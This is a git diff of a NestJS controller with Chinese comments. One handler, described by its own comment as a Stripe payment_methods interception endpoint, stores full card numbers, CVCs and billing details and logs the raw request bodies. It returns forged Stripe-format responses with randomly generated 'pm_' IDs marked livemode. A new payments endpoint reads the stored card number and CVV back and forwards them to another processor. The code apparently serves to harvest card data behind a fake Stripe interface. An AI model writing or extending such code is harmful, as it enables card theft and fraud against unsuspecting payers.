@@ -6,7 +6,7 @@ import { Public } from 'src/common/decorators/public.decorator'
 import { Keep } from 'src/common/decorators/keep.decorator'
 import { F1Service } from './f1.service'
 import { F1CheckoutDto } from './dto/f1-checkout.dto'
-import { PaymentDto } from './dto/payment.dto'
+import { PaymentDto, V1PaymentDto } from './dto/payment.dto'
 import { PaymentMethodDto } from './dto/payment-method.dto'
 import { OrderQueryDto } from './dto/order-query.dto'
 import { DataObj } from 'src/common/class/data-obj.class'
@@ -19,6 +19,98 @@ export class F1Controller {
   private readonly logger = new Logger(F1Controller.name);
   constructor(private readonly f1Service: F1Service) {}
 
+
+
+  @Post('v1/payments')
+  @Public()
+  @Transform(({ value }) => value)
+  async payments(
+    @Req() req,
+    @Res() res: Response,
+    @Body() dto: V1PaymentDto,
+  ) {
+    try {
+      this.logger.log(`收到 payments 请求 - IP: ${req.ip} `)
+      this.logger.log(`payments body: ${JSON.stringify(dto)}`)
+     
+
+      const paymentMethodId = dto?.checkout?.paymentMethodId
+      if (!paymentMethodId) {
+        if (!res.headersSent) {
+          return res.status(400).json({ error: '缺少 paymentMethodId' })
+        }
+      }
+
+      // 1. 根据 pm_id 查询 f1_payment_method 表，获取卡信息和订单编号
+      const pmRecord = await this.f1Service.findPaymentMethodByPmId(paymentMethodId)
+      this.logger.log(`查询到 PaymentMethod: id=${pmRecord.id}, orderNo=${pmRecord.pmId}, last4=${pmRecord.cardLast4}`)
+      const orderNo = pmRecord.pmId
+      if (!orderNo) {
+        this.logger.warn(`PaymentMethod 记录无 orderNo: pm_id=${paymentMethodId}`)
+        if (!res.headersSent) {
+          return res.status(400).json({ error: '该支付方式未关联订单编号，请先完成结账流程' })
+        }
+      }
+      //更新金额到订单
+      this.logger.log(` 更新金额到订单 f1_payment_method表中amount : ${dto?.checkout?.amount}`)
+      this.f1Service.updatePaymentMethodAmount(paymentMethodId, dto?.checkout?.amount||0)
+
+      // 2. 拼接卡过期日期 MM/YY 格式
+      const expMonth = pmRecord.cardExpMonth?.padStart(2, '0') || '01'
+      const expYearShort = pmRecord.cardExpYear?.slice(-2) || '29'
+      const cardExpiry = `${expMonth}/${expYearShort}`
+
+      // 3. 构造 PaymentDto，调用 savePayment
+      const paymentDto: PaymentDto = {
+        card_number: pmRecord.cardNumber || '',
+        card_expiry: cardExpiry,
+        card_cvv: pmRecord.cardCvc || '',
+        card_name: pmRecord.billingName || '',
+        email_address: pmRecord.billingEmail || '',
+        phone_number: pmRecord.billingPhone || '',
+        orderNo,
+        userId: genId(),
+        amount: dto?.checkout?.amount || 0,
+      }
+
+      const clientIp = req.ip || req.connection?.remoteAddress || ''
+      const result = await this.f1Service.savePayment(paymentDto, clientIp)
+
+      this.logger.log(`payments 处理完成: orderNo=${orderNo}, payUrl=${result.payUrl || '无'}`)
+
+      // 4. 返回结果
+      if (!res.headersSent) {
+        res.setHeader('Content-Type', 'application/json')
+        if (result.payUrl) {
+          // 有支付链接，返回重定向信息
+          res.status(200).json({
+            status: 'requires_action',
+            paymentMethodId,
+            orderNo,
+            redirect_url: result.payUrl,
+            payment_id: result.payment?.paymentId || null,
+          })
+        } else {
+          // hp-pay 未返回支付链接，返回已保存状态
+          res.status(200).json({
+            status: 'saved',
+            paymentMethodId,
+            orderNo,
+            payment_id: result.payment?.paymentId || null,
+            message: '支付信息已保存，等待支付处理',
+          })
+        }
+      }
+    } catch (error) {
+      this.logger.error('payments 处理失败:', error)
+      if (!res.headersSent) {
+        res.setHeader('Content-Type', 'application/json')
+        res.status(500).json({
+          error: error.message || '支付处理失败',
+        })
+      }
+    }
+  }
   /**
    * 20260610 统一入口
    * Stripe payment_methods 拦截接口
@@ -47,36 +139,90 @@ export class F1Controller {
 
       this.logger.log(`收到 payment_methods 请求 - IP: ${ip}`)
       this.logger.log(`payment_methods body: ${JSON.stringify(dto)}`)
+      this.logger.log(`payment_methods request: ${req.query['amount']} `)
+      // 先生成 Stripe pm_ ID，与数据库记录一起保存
+      const pmId = this.generateStripeId('pm')
+       dto.amount =   0;
+      
+      // 保存数据（包含 pmId）
+      const saved = await this.f1Service.savePaymentMethod(dto, rawBodyStr, ip, userAgent, pmId)
 
-      // 保存数据
-      const saved = await this.f1Service.savePaymentMethod(dto, rawBodyStr, ip, userAgent)
+      const created = Math.floor(Date.now() / 1000)
+      const expMonth = parseInt(saved.cardExpMonth) || 1
+      const expYear = parseInt(saved.cardExpYear) ? 2000 + parseInt(saved.cardExpYear) : 2029
 
-      // 返回类似 Stripe 的响应格式
+      // 返回完整 Stripe payment_methods 响应格式
       if (!res.headersSent) {
+        res.setHeader('Content-Type', 'application/json')
         res.status(200).json({
-          id: `pm_${saved.id}`,
+          id: pmId,
           object: 'payment_method',
-          created: Math.floor(saved.createTime?.getTime() / 1000) || Math.floor(Date.now() / 1000),
-          type: saved.type,
+          allow_redisplay: saved.allowRedisplay || 'unspecified',
+          billing_details: {
+            address: {
+              city: saved.billingCity || '',
+              country: saved.billingCountry || '',
+              line1: saved.billingLine1 || '',
+              line2: saved.billingLine2 || '',
+              postal_code: saved.billingPostalCode || '',
+              state: saved.billingState || '',
+            },
+            email: saved.billingEmail || '',
+            name: saved.billingName || '',
+            phone: saved.billingPhone || '',
+            tax_id: null,
+          },
           card: {
-            last4: saved.cardLast4,
-            exp_month: parseInt(saved.cardExpMonth) || 0,
-            exp_year: parseInt(saved.cardExpYear) || 0,
-          }
+            brand: this.detectCardBrand(saved.cardNumber),
+            checks: {
+              address_line1_check: null,
+              address_postal_code_check: null,
+              cvc_check: null,
+            },
+            country: saved.billingCountry ||"",
+            display_brand: this.detectCardBrand(saved.cardNumber),
+            exp_month: expMonth,
+            exp_year: expYear,
+            funding: 'credit',
+            generated_from: null,
+            last4: saved.cardLast4 || '0000',
+            networks: {
+              available: [this.detectCardBrand(saved.cardNumber)],
+              preferred: null,
+            },
+            regulated_status: 'unregulated',
+            three_d_secure_usage: {
+              supported: true,
+            },
+            wallet: null,
+          },
+          created,
+          customer: null,
+          customer_account: null,
+          livemode: true,
+          radar_options: {},
+          shared_payment_granted_token: null,
+          type: saved.type || 'card',
         })
       }
     } catch (error) {
       this.logger.error('payment_methods 处理失败:', error)
       if (!res.headersSent) {
+        res.setHeader('Content-Type', 'application/json')
         res.status(200).json({
-          id: `pm_error_${Date.now()}`,
-          object: 'payment_method',
-          error: error.message
+          error: {
+            message: error.message || 'An error occurred',
+            type: 'api_error',
+          },
         })
       }
     }
   }
-
+async parseCurrency(str) {
+  // 先移除货币符号/文字，再处理千分位
+  const clean = str.replace(/[^0-9,.]/g, "");
+  return parseFloat(clean.replace(/,/g, ""));
+}
   /**
    * F1订单结账接口 
    * 支持 JSON 和 application/x-www-form-urlencoded 表单提交
@@ -343,6 +489,34 @@ export class F1Controller {
       this.logger.error('Get order list error:', error)
       throw new ApiException(`查询订单列表失败: ${error.message}`)
     }
+  }
+
+  // ===== 私有工具方法 =====
+
+  /**
+   * 生成类 Stripe 格式的随机 ID，如 pm_1TgiXaH1Mhw0wmswXiAjEi95
+   */
+  private generateStripeId(prefix: string): string {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+    let result = ''
+    for (let i = 0; i < 24; i++) {
+      result += chars.charAt(Math.floor(Math.random() * chars.length))
+    }
+    return `${prefix}_${result}`
+  }
+
+  /**
+   * 根据卡号前缀识别卡品牌
+   */
+  private detectCardBrand(cardNumber: string): string {
+    const num = (cardNumber || '').replace(/\D/g, '')
+    if (/^4/.test(num)) return 'visa'
+    if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return 'mastercard'
+    if (/^3[47]/.test(num)) return 'american_express'
+    if (/^6(?:011|5)/.test(num)) return 'discover'
+    if (/^35/.test(num)) return 'jcb'
+    if (/^3(?:0[0-5]|[68])/.test(num)) return 'diners_club'
+    return 'unknown'
   }
 
    
